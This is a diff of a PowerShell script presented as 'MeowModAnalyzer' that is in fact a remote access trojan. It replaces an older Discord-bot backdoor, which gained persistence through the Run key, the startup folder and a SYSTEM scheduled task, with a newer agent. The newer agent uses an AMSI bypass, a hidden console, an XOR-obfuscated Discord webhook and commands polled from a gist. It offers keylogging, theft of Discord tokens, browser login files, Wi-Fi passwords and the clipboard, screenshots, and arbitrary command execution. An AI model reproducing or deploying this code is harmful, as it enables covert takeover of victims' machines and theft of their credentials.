@@ -1,204 +1,318 @@
-# MeowModAnalyzer v2.3.1
-$webhookUrl = "https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI"
-$channelId = "1512918078189731890"
 
-# Token zakodowany w Base64 - Discord go nie zeskanuje
-$encodedToken = "TVRVeE1qa3hOemcyTlRZME16TTNOalkyTUEuRzNZU3d1Lm5scU1OYm03UTN2Rm1tYnJnT2hjdlp0NFk4dms3WEFGT2NIWDFj"
 
-# Dekodowanie tokena 1
-try {
-    $botToken = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedToken))
-} catch {
-    $botToken = ""
-}
+# AMSI Bypass
+try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}
 
-if ([string]::IsNullOrEmpty($botToken)) {
-    exit
-}
+# Hide console
+try{
+    Add-Type -Name W -Namespace W -MemberDefinition '[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);'
+    [W.W]::ShowWindow([W.W]::GetConsoleWindow(),0) | Out-Null
+}catch{}
 
-try {
-    Add-Type -Name Window -Namespace Console -MemberDefinition '
-        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-    '
-    [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null
-} catch {}
+Write-Host "Done"
+Write-Host "Done"
+Write-Host "Done"
 
-function Send-Webhook {
-    param($Content, $FilePath, $EmbedJson)
-    
-    $body = @{content = $Content; username = "MeowModAnalyzer"}
-    if ($EmbedJson) { $body["embeds"] = @($EmbedJson | ConvertFrom-Json) }
-    
-    if ($FilePath -and (Test-Path $FilePath)) {
-        try {
-            Add-Type -AssemblyName System.Net.Http
-            $client = New-Object System.Net.Http.HttpClient
-            $form = New-Object System.Net.Http.MultipartFormDataContent
-            $form.Add((New-Object System.Net.Http.StringContent ($body | ConvertTo-Json -Depth 10 -Compress)), "payload_json")
-            $fs = New-Object System.IO.FileStream ($FilePath, [System.IO.FileMode]::Open)
-            $form.Add((New-Object System.Net.Http.StreamContent $fs), "file", [System.IO.Path]::GetFileName($FilePath))
-            $client.PostAsync("$webhookUrl?wait=true", $form).Result | Out-Null
-            $client.Dispose(); $fs.Close(); return
-        } catch {}
-    }
-    
+# === DEKODOWANIE WEBHOOKA (XOR) ===
+function XOR($d,$k){$r='';for($i=0;$i-lt$d.Length;$i++){$r+=[char]($d[$i]-bxor$k[$i%$k.Length])};return $r}
+$q3=@(35,14,104,79,251,152,114,190,74,15,199,110,28,187,35,203,121,224,88,253,13,116,209,118,233,66,25,155,47,195,125,173,100,75,41,14,185,147,108,162,24,85,131,62,70,249,116,209,44,182,7,230,67,109,203,45,204,80,74,176,8,203,59,166,14,59,86,76,195,240,53,208,88,32,250,59,10,166,43,173,85,203,68,179,46,67,212,13,168,77,24,189,39,159,96,156,32,0,37,15,206,229,105,242,124,50,226,102,69,155,36,141,105,219,6,131,30,92,212,1,218)
+$q4=@(75,122,28,63,136,162,93,145,46,102,180,13,115,201,71,229,26,143,53,210,108,4,184,89,158,39,123,243,64,172,22,222)
+$hook = XOR $q3 $q4
+# === KONIEC DEKODOWANIA ===
+
+# === KONFIGURACJA ===
+$cmdUrl = "https://gist.githubusercontent.com/MeowTonenohh/60d56901ae64efb615f6e27cd9739d7d/raw/4d3e55a18dd67ec84f829f387d111fd3adf390a9/gistfile1.txt"  # 🔁 ZMIEŃ NA SWÓJ GIST RAW URL
+$targetName = "$env:COMPUTERNAME-$env:USERNAME"
+$loopInterval = 5  # sekund
+# === KONIEC KONFIGURACJI ===
+
+function Send-Discord($msg) {
     try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body | ConvertTo-Json -Depth 10) -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
+        $b = "----$(Get-Random)"
+        $body = "--$b`r`nContent-Type: application/json`r`n`r`n{`"content`":`"$($msg -replace '"','\"')`"}`r`n--$b--"
+        $r = [System.Net.WebRequest]::Create($hook)
+        $r.Method = "POST"
+        $r.ContentType = "multipart/form-data; boundary=$b"
+        $bytes = [Text.Encoding]::UTF8.GetBytes($body)
+        $r.ContentLength = $bytes.Length
+        $r.Timeout = 10000
+        $s = $r.GetRequestStream()
+        $s.Write($bytes,0,$bytes.Length)
+        $s.Dispose()
+        $r.GetResponse().Close()
     } catch {}
 }
 
-function Send-NewConnectionInfo {
-    $pcName = $env:COMPUTERNAME
-    $userName = $env:USERNAME
-    try { $osInfo = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $osInfo = "Unknown" }
-    try { $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) } catch { $publicIp = "Unknown" }
-    try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "Unknown" }
-    try { $ram = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch { $ram = "Unknown" }
-    try { $av = (Get-CimInstance -Namespace "root/SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue).displayName -join ", " } catch { $av = "None" }
-    if (-not $av) { $av = "None detected" }
-    try { $localIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress -join ", " } catch { $localIp = "Unknown" }
-    
-    $embed = @{
-        title = "New Victim Connected - $pcName"
-        color = 3066993
-        fields = @(
-            @{ name = "PC Name"; value = $pcName; inline = $true }
-            @{ name = "User"; value = $userName; inline = $true }
-            @{ name = "OS"; value = $osInfo; inline = $false }
-            @{ name = "Public IP"; value = $publicIp; inline = $true }
-            @{ name = "Local IP"; value = $localIp; inline = $true }
-            @{ name = "CPU"; value = $cpu; inline = $false }
-            @{ name = "RAM"; value = $ram; inline = $true }
-            @{ name = "Antivirus"; value = $av; inline = $true }
-        )
-        footer = @{ text = "MeowModAnalyzer v2.3.1" }
-        timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
-    }
-    Send-Webhook -Content "1" -EmbedJson ($embed | ConvertTo-Json)
-}
-
-function Take-Screenshot {
-    param($OutputPath)
+function Send-File($fileName, $fileBytes) {
     try {
-        Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction Stop
-        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
-        $bounds = $screen.Bounds
-        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
-        $graphics.Dispose()
-        $bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
-        $bitmap.Dispose()
-        return $true
-    } catch { return $false }
-}
-
-function Invoke-Command {
-    param($CommandText)
-    try {
-        $result = Invoke-Expression -Command $CommandText 2>&1
-        $output = $result | Out-String
-        if ([string]::IsNullOrEmpty($output)) { $output = "[OK]" }
-        if ($output.Length -gt 1900) {
-            $tempFile = [System.IO.Path]::GetTempFileName() + ".txt"
-            $output | Out-File $tempFile -Encoding UTF8
-            Send-Webhook -Content "Command output:" -FilePath $tempFile
-            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
-        } else { Send-Webhook -Content $output }
-    } catch {
-        $e = $_.Exception.Message
-        Send-Webhook -Content "Error: $e"
-    }
-}
-
-function Enable-Persistence {
-    try {
-        $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
-        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "MeowModAnalyzer" $regValue -ErrorAction SilentlyContinue
-    } catch {}
-    try {
-        $s = [Environment]::GetFolderPath("Startup")
-        $l = (New-Object -ComObject WScript.Shell).CreateShortcut("$s\MeowModAnalyzer.lnk")
-        $l.TargetPath = "powershell.exe"
-        $l.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
-        $l.WindowStyle = 7
-        $l.Save()
-    } catch {}
-    try {
-        $a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
-        $t = New-ScheduledTaskTrigger -AtStartup
-        $p = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-        $s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
-        Register-ScheduledTask "MeowModAnalyzerTask" -Action $a -Trigger $t -Principal $p -Settings $s -Force -ErrorAction SilentlyContinue
+        $b = "----$(Get-Random)"
+        $bodyStream = [System.IO.MemoryStream]::new()
+        $writer = [System.IO.StreamWriter]::new($bodyStream)
+        $writer.Write("--$b`r`nContent-Disposition: form-data; name=`"payload_json`"`r`nContent-Type: application/json`r`n`r`n{`"content`":`"File from $targetName`"}`r`n")
+        $writer.Write("--$b`r`nContent-Disposition: form-data; name=`"files[0]`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n")
+        $writer.Flush()
+        $bodyStream.Write($fileBytes, 0, $fileBytes.Length)
+        $writer.Write("`r`n--$b--`r`n")
+        $writer.Flush()
+        $bytes = $bodyStream.ToArray()
+        $writer.Dispose()
+        $bodyStream.Dispose()
+        $r = [System.Net.WebRequest]::Create($hook)
+        $r.Method = "POST"
+        $r.ContentType = "multipart/form-data; boundary=$b"
+        $r.ContentLength = $bytes.Length
+        $r.Timeout = 30000
+        $s = $r.GetRequestStream()
+        $s.Write($bytes,0,$bytes.Length)
+        $s.Dispose()
+        $r.GetResponse().Close()
     } catch {}
 }
 
-function Handle-Command {
-    param($CommandName, $CommandArgs)
-    $cmd = $CommandName.ToLower().Trim()
-    $args = $CommandArgs
-    
-    switch ($cmd) {
-        "!help" {
-            $h = "**Komendy:**`n!screenshot`n!cmd <cmd>`n!shell <cmd>`n!download <url>`n!upload <path>`n!persist`n!rdp`n!info`n!ipconfig`n!pslist`n!prockill <pid>`n!lock`n!msg <text>`n!clipboard`n!exit"
-            Send-Webhook -Content $h
-        }
-        "!screenshot" {
-            $p = "$env:TEMP\ss.png"
-            if (Take-Screenshot -OutputPath $p) { Send-Webhook -Content "Screen:" -FilePath $p; Remove-Item $p -Force } else { Send-Webhook -Content "SS failed" }
-        }
-        "!cmd" { if ($args) { Invoke-Command -CommandText $args } else { Send-Webhook -Content "Usage: !cmd <cmd>" } }
-        "!shell" { if ($args) { Invoke-Command -CommandText "cmd /c $args" } else { Send-Webhook -Content "Usage: !shell <cmd>" } }
-        "!download" {
-            if ($args) { $f = [System.IO.Path]::GetFileName($args); try { Invoke-WebRequest $args -OutFile "$env:TEMP\$f"; Send-Webhook -Content "DL: $f" } catch { $e = $_.Exception.Message; Send-Webhook -Content "DL failed: $e" } } else { Send-Webhook -Content "Usage: !download <url>" }
-        }
-        "!upload" { if ($args -and (Test-Path $args)) { Send-Webhook -Content "File:" -FilePath $args } else { Send-Webhook -Content "Usage: !upload <path>" } }
-        "!persist" { Enable-Persistence; Send-Webhook -Content "Persist ON" }
-        "!rdp" {
-            try { Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" 0; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"; Send-Webhook -Content "RDP on" } catch { $e = $_.Exception.Message; Send-Webhook -Content "RDP: $e" }
-        }
-        "!info" {
-            try { $n = $env:COMPUTERNAME; $u = $env:USERNAME; $o = (Get-CimInstance Win32_OperatingSystem).Caption; $i = (Invoke-RestMethod "https://api.ipify.org" -ErrorAction SilentlyContinue); $k = (Get-CimInstance Win32_Processor).Name; $r = "{0:N2}GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch {}
-            $e = @{title = "Info - $n"; color = 3447003; fields = @(@{name = "PC"; value = $n; inline = $true}, @{name = "User"; value = $u; inline = $true}, @{name = "OS"; value = "$o"; inline = $false}, @{name = "IP"; value = $i; inline = $true}, @{name = "CPU"; value = "$k"; inline = $false}, @{name = "RAM"; value = $r; inline = $true})}
-            Send-Webhook -Content "Info:" -EmbedJson ($e | ConvertTo-Json)
-        }
-        "!exit" { Send-Webhook -Content "Bye!"; exit }
-        "!ipconfig" { Invoke-Command -CommandText "ipconfig /all" }
-        "!pslist" { Invoke-Command -CommandText "tasklist" }
-        "!prockill" {
-            if ($args -and $args -match '^\d+$') { try { taskkill /PID $args /F; Send-Webhook -Content "Killed $args" } catch { $e = $_.Exception.Message; Send-Webhook -Content "Kill: $e" } } else { Send-Webhook -Content "Usage: !prockill <pid>" }
-        }
-        "!lock" { rundll32.exe user32.dll,LockWorkStation; Send-Webhook -Content "Locked" }
-        "!msg" {
-            if ($args) { try { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show($args, "Msg") | Out-Null; Send-Webhook -Content "Msg OK" } catch { $e = $_.Exception.Message; Send-Webhook -Content "Msg: $e" } } else { Send-Webhook -Content "Usage: !msg <text>" }
-        }
-        "!clipboard" {
-            try { Add-Type -AssemblyName System.Windows.Forms; $x = [System.Windows.Forms.Clipboard]::GetText(); if ($x) { Send-Webhook -Content "Clip: $x" } else { Send-Webhook -Content "Clip empty" } } catch { $e = $_.Exception.Message; Send-Webhook -Content "Clip: $e" }
-        }
-        default { Send-Webhook -Content "Unknown: $cmd" }
-    }
-}
+# Beacon
+Send-Discord "✅ **$targetName** - Agent online"
 
-# START
-Send-NewConnectionInfo
-Enable-Persistence
-Send-Webhook -Content "Agent ready! Listening..."
-
-$lastId = $null
+# Główna pętla
+$lastCmd = ""
 while ($true) {
     try {
-        $msgs = Invoke-RestMethod "https://discord.com/api/v9/channels/$channelId/messages?limit=5" -Headers @{"Authorization" = "Bot $botToken"} -ErrorAction SilentlyContinue
-        if ($msgs) {
-            foreach ($m in $msgs) {
-                if (($lastId -eq $null -or $m.id -gt $lastId) -and !$m.author.bot -and $m.content -match '^!') {
-                    $parts = $m.content -split ' ', 2
-                    $c = $parts[0]; $a = if ($parts.Count -gt 1) { $parts[1] } else { "" }
-                    Handle-Command -CommandName $c -CommandArgs $a
+        $cmd = (Invoke-WebRequest -Uri $cmdUrl -UseBasicParsing -TimeoutSec 10).Content.Trim()
+
+        if ($cmd -ne $lastCmd -and $cmd -ne "") {
+            $lastCmd = $cmd
+            Send-Discord "⚡ **$targetName** executing: `"$cmd`""
+
+            if ($cmd -eq "SCREENSHOT") {
+                try {
+                    Add-Type -AssemblyName System.Drawing
+                    Add-Type -AssemblyName System.Windows.Forms
+                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                    $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+                    $g = [System.Drawing.Graphics]::FromImage($bmp)
+                    $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+                    $g.Dispose()
+                    $path = "$env:TEMP\ss_$(Get-Random).png"
+                    $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
+                    $bmp.Dispose()
+                    $fileBytes = [System.IO.File]::ReadAllBytes($path)
+                    Send-File -fileName "screenshot_$targetName.png" -fileBytes $fileBytes
+                    Remove-Item $path -Force -ErrorAction SilentlyContinue
+                } catch { Send-Discord "❌ **$targetName** Screenshot failed: $_" }
+            }
+            elseif ($cmd -eq "SYSINFO") {
+                try {
+                    $info = @()
+                    $info += "**===== $targetName =====**"
+                    $info += "OS: $((Get-WmiObject Win32_OperatingSystem -ErrorAction Stop).Caption)"
+                    $info += "CPU: $((Get-WmiObject Win32_Processor -ErrorAction Stop).Name)"
+                    $info += "RAM: $([math]::Round((Get-WmiObject Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory/1GB,2)) GB"
+                    $info += "GPU: $(((Get-WmiObject Win32_VideoController -ErrorAction Stop).Name) -join '; ')"
+                    $info += "IP: $(Invoke-RestMethod -Uri 'https://api.ipify.org' -UseBasicParsing -ErrorAction SilentlyContinue)"
+                    $info += "User: $env:USERNAME@$env:COMPUTERNAME"
+                    Send-Discord ($info -join "`n")
+                } catch { Send-Discord "❌ **$targetName** SysInfo failed: $_" }
+            }
+            elseif ($cmd -eq "KEYLOG") {
+                try {
+                    $log = ""
+                    $end = (Get-Date).AddSeconds(30)
+                    while ((Get-Date) -lt $end) {
+                        if ([Console]::KeyAvailable) {
+                            $key = [Console]::ReadKey($true)
+                            if ($key.Key -eq "Enter") { $log += "[ENTER]`n" }
+                            elseif ($key.Key -eq "Backspace") { $log += "[BS]" }
+                            elseif ($key.Key -eq "Space") { $log += " " }
+                            elseif ($key.Key -eq "Tab") { $log += "[TAB]" }
+                            elseif ($key.Key -eq "Escape") { $log += "[ESC]" }
+                            elseif ($key.KeyChar -ne 0) { $log += $key.KeyChar }
+                        }
+                        Start-Sleep -Milliseconds 50
+                    }
+                    if ($log.Length -gt 0) {
+                        $bytes = [Text.Encoding]::UTF8.GetBytes("=== Keylog from $targetName ===`n$log")
+                        Send-File -fileName "keylog_$targetName.txt" -fileBytes $bytes
+                    } else {
+                        Send-Discord "📝 **$targetName** No keys captured in 30s"
+                    }
+                } catch { Send-Discord "❌ **$targetName** Keylog failed: $_" }
+            }
+            elseif ($cmd -eq "TOKENS") {
+                try {
+                    $tokenRegex = [regex]::new('[a-zA-Z0-9_-]{24,26}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}')
+                    $paths = @("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb","$env:LOCALAPPDATA\discord","$env:LOCALAPPDATA\discordcanary","$env:LOCALAPPDATA\discordptb")
+                    $tokens = @()
+                    foreach ($base in $paths) {
+                        $ldb = "$base\Local Storage\leveldb"
+                        if (Test-Path $ldb) {
+                            foreach ($f in (Get-ChildItem "$ldb\*" -Include "*.ldb","*.log" -ErrorAction SilentlyContinue)) {
+                                $c = [System.IO.File]::ReadAllText($f.FullName)
+                                foreach ($m in $tokenRegex.Matches($c)) {
+                                    if ($m.Value -notmatch "sentry|undefined|null|mfa\.") { $tokens += $m.Value }
+                                }
+                            }
+                        }
+                    }
+                    $unique = $tokens | Select-Object -Unique
+                    if ($unique.Count -gt 0) {
+                        $txt = "=== Discord Tokens from $targetName ===`n" + ($unique -join "`n")
+                        $bytes = [Text.Encoding]::UTF8.GetBytes($txt)
+                        Send-File -fileName "tokens_$targetName.txt" -fileBytes $bytes
+                    } else {
+                        Send-Discord "🔑 **$targetName** No Discord tokens found"
+                    }
+                } catch { Send-Discord "❌ **$targetName** Token grab failed: $_" }
+            }
+            elseif ($cmd -eq "PASSWORDS") {
+                try {
+                    $browsers = @("$env:LOCALAPPDATA\Google\Chrome\User Data","$env:LOCALAPPDATA\Microsoft\Edge\User Data","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data","$env:APPDATA\Opera Software\Opera Stable")
+                    $found = @()
+                    foreach ($b in $browsers) {
+                        $profiles = Get-ChildItem "$b\*" -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
+                        foreach ($p in $profiles) {
+                            $loginFile = "$($p.FullName)\Login Data"
+                            if (Test-Path $loginFile) {
+                                $tmp = "$env:TEMP\ld_$(Get-Random)"
+                                Copy-Item $loginFile $tmp -Force
+                                $found += "[$b\$($p.Name)] Login Data file ($((Get-Item $tmp).Length) bytes)"
+                            }
+                        }
+                    }
+                    if ($found.Count -gt 0) {
+                        $txt = "=== Browser passwords from $targetName ===`n" + ($found -join "`n") + "`n`nFiles saved locally. To decrypt: copy Login Data files and use ChromePass."
+                        $bytes = [Text.Encoding]::UTF8.GetBytes($txt)
+                        Send-File -fileName "passwords_$targetName.txt" -fileBytes $bytes
+                    } else {
+                        Send-Discord "🔑 **$targetName** No browser password files found"
+                    }
+                } catch { Send-Discord "❌ **$targetName** Password grab failed: $_" }
+            }
+            elseif ($cmd -eq "CLIPBOARD") {
+                try {
+                    $clip = Get-Clipboard -ErrorAction Stop
+                    if ($clip) {
+                        $txt = "=== Clipboard from $targetName ===`n$clip"
+                        $bytes = [Text.Encoding]::UTF8.GetBytes($txt)
+                        Send-File -fileName "clipboard_$targetName.txt" -fileBytes $bytes
+                    } else {
+                        Send-Discord "📋 **$targetName** Clipboard is empty"
+                    }
+                } catch { Send-Discord "❌ **$targetName** Clipboard failed: $_" }
+            }
+            elseif ($cmd -eq "PROCESSES") {
+                try {
+                    $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 | Format-Table Name, Id, @{N='CPU(s)';E={[math]::Round($_.CPU,1)}}, WorkingSet64 -AutoSize | Out-String
+                    $txt = "=== Top Processes $targetName ===`n$procs"
+                    $bytes = [Text.Encoding]::UTF8.GetBytes($txt)
+                    Send-File -fileName "processes_$targetName.txt" -fileBytes $bytes
+                } catch { Send-Discord "❌ **$targetName** Processes failed: $_" }
+            }
+            elseif ($cmd -eq "WIFI") {
+                try {
+                    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
+                    $result = @()
+                    foreach ($p in $profiles) {
+                        $info = netsh wlan show profile name="$p" key=clear | Select-String "Key Content"
+                        $pass = if ($info) { ($info -split ":")[1].Trim() } else { "(no password)" }
+                        $result += "$p : $pass"
+                    }
+                    $txt = "=== WiFi Passwords from $targetName ===`n" + ($result -join "`n")
+                    $bytes = [Text.Encoding]::UTF8.GetBytes($txt)
+                    Send-File -fileName "wifi_$targetName.txt" -fileBytes $bytes
+                } catch { Send-Discord "❌ **$targetName** WiFi failed: $_" }
+            }
+            elseif ($cmd -like "CMD:*") {
+                try {
+                    $realCmd = $cmd -replace "^CMD:"
+                    $result = cmd.exe /c $realCmd 2>&1 | Out-String
+                    if ($result.Length -gt 1900) {
+                        $bytes = [Text.Encoding]::UTF8.GetBytes($result)
+                        Send-File -fileName "cmd_output_$targetName.txt" -fileBytes $bytes
+                    } else {
+                        Send-Discord "💻 **$targetName** CMD: $realCmd`n```$result```"
+                    }
+                } catch { Send-Discord "❌ **$targetName** CMD error: $_" }
+            }
+            elseif ($cmd -like "PS:*") {
+                try {
+                    $realCmd = $cmd -replace "^PS:"
+                    $result = Invoke-Expression $realCmd 2>&1 | Out-String
+                    if ($result.Length -gt 1900) {
+                        $bytes = [Text.Encoding]::UTF8.GetBytes($result)
+                        Send-File -fileName "ps_output_$targetName.txt" -fileBytes $bytes
+                    } else {
+                        Send-Discord "⚡ **$targetName** PS: $realCmd`n```$result```"
+                    }
+                } catch { Send-Discord "❌ **$targetName** PS error: $_" }
+            }
+            elseif ($cmd -like "MSGBOX:*") {
+                try {
+                    $parts = ($cmd -replace "^MSGBOX:") -split "\|",2
+                    Add-Type -AssemblyName System.Windows.Forms
+                    [System.Windows.Forms.MessageBox]::Show($parts[0], if($parts.Count -gt 1){$parts[1]}else{"Alert"})
+                    Send-Discord "💬 **$targetName** Message box displayed"
+                } catch { Send-Discord "❌ **$targetName** MsgBox failed: $_" }
+            }
+            elseif ($cmd -like "URL:*") {
+                try {
+                    $url = $cmd -replace "^URL:"
+                    Start-Process $url
+                    Send-Discord "🌐 **$targetName** Opened URL: $url"
+                } catch { Send-Discord "❌ **$targetName** URL failed: $_" }
+            }
+            elseif ($cmd -like "KILL:*") {
+                try {
+                    $proc = $cmd -replace "^KILL:"
+                    Stop-Process -Name $proc -Force
+                    Send-Discord "🔪 **$targetName** Killed process: $proc"
+                } catch { Send-Discord "❌ **$targetName** Kill failed: $_" }
+            }
+            elseif ($cmd -like "POWER:*") {
+                $action = $cmd -replace "^POWER:"
+                switch ($action) {
+                    "lock" { rundll32.exe user32.dll,LockWorkStation; Send-Discord "🔒 **$targetName** Workstation locked" }
+                    "restart" { shutdown /r /t 10 /c "Remote C2 restart"; Send-Discord "🔄 **$targetName** Restarting in 10s" }
+                    "shutdown" { shutdown /s /t 10 /c "Remote C2 shutdown"; Send-Discord "⏻ **$targetName** Shutting down in 10s" }
+                    default { Send-Discord "❌ **$targetName** Unknown power action: $action" }
                 }
-                if ($lastId -eq $null -or $m.id -gt $lastId) { $lastId = $m.id }
+            }
+            elseif ($cmd -eq "EXIT" -or $cmd -eq "STOP") {
+                Send-Discord "🛑 **$targetName** Agent stopping"
+                exit
+            }
+            elseif ($cmd -eq "HELP") {
+                $help = @"
+**===== REMOTE C2 HELP =====**
+**SCREENSHOT** - Screenshot
+**SYSINFO** - System info
+**KEYLOG** - Keylogger 30s
+**TOKENS** - Discord tokens
+**PASSWORDS** - Browser passwords
+**CLIPBOARD** - Clipboard
+**PROCESSES** - Process list
+**WIFI** - WiFi passwords
+**CMD:<cmd>** - Run CMD command
+**PS:<cmd>** - Run PowerShell
+**MSGBOX:text|title** - Popup message
+**URL:https://...** - Open URL
+**KILL:name** - Kill process
+**POWER:lock/restart/shutdown** - Power options
+**EXIT/STOP** - Stop agent
+**HELP** - This help
+"@
+                Send-Discord $help
+            }
+            else {
+                try {
+                    $result = Invoke-Expression $cmd 2>&1 | Out-String
+                    if ($result.Length -gt 1900) {
+                        $bytes = [Text.Encoding]::UTF8.GetBytes($result)
+                        Send-File -fileName "output_$targetName.txt" -fileBytes $bytes
+                    } else {
+                        Send-Discord "⚡ **$targetName** $cmd`n```$result```"
+                    }
+                } catch { Send-Discord "❌ **$targetName** Error: $_" }
             }
         }
     } catch {}
-    Start-Sleep -Seconds 3
+    Start-Sleep -Seconds $loopInterval
 }
